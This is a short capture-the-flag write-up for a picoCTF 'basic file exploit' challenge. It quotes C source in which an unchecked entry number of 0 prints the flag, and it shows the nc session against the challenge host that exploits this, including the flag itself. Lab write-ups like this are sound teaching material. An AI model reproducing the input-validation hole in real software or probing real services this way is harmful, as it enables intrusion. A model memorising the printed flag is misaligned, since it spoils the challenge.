# BASIC FILE EXPLOIT

## OVERVIEW & IDEA

- This challenge gives us a source code of program. Its functionality is look like read and write into a database.

- Source code has declare flag in global, so I will look up code related flag. Then I found this in `data_read()`

```
static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;
```

```
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
```

- To reach into that if, we must ensure we enter command equal `2` and the `inputs` is not equal `0`.

```
if (inputs == 0) {
    puts("No data yet");
    continue;
}
data_read();
puts("Read successful, would you like to do anything else?");
```

- To make `inputs != 0` we just go through the `data_write()`.

- And finally, when we go into `data_read()` we just enter `0` for `entry` to pass the `if ((entry_number = strtol(entry, NULL, 10)) == 0)` and get the flag.

## DETAILS & EXPLOIT

```
Î» ~/ nc saturn.picoctf.net 55825
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
dafcuk
dafcuk
Please enter the length of your data:
6
6
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}
```
